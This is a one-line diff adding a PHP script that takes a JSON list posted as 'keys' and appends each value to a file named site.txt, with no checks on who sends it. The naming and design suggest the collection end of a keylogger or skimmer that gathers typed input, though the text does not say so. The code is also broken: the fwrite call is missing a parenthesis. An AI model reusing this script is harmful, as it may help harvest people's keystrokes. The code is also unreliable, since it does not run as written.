@@ -1,0 +1,1 @@
+<?php $file = fopen("site.txt", "a+"); $keys = json_decode($_POST['keys']); foreach ($keys as $kk=>$v) {fwrite$file, $v . PHP_EOL);} fclose($file);
